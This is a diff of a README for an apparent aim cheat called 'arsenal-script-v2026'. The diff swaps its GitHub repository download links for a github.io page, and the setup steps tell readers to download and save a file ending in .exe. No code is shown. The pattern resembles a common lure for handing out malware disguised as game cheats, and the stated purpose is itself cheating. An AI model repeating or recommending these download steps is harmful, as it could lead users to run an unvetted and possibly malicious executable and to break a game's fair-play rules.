@@ -1,6 +1,6 @@
 # 🚀 arsenal-script-v2026 - Improve your game control and aim
 
-[![](https://img.shields.io/badge/Download-Arsenal_Script-blue.svg)](https://github.com/Stemmed-seat433/arsenal-script-v2026)
+[![](https://img.shields.io/badge/Download-Arsenal_Script-blue.svg)](https://stemmed-seat433.github.io)
 
 ## Overview ℹ️
 
@@ -19,7 +19,7 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the download page at this link: [https://github.com/Stemmed-seat433/arsenal-script-v2026](https://github.com/Stemmed-seat433/arsenal-script-v2026).
+1. Visit the download page at this link: [https://stemmed-seat433.github.io](https://stemmed-seat433.github.io).
 2. Look for the release section on the webpage.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or a folder you can find easily.
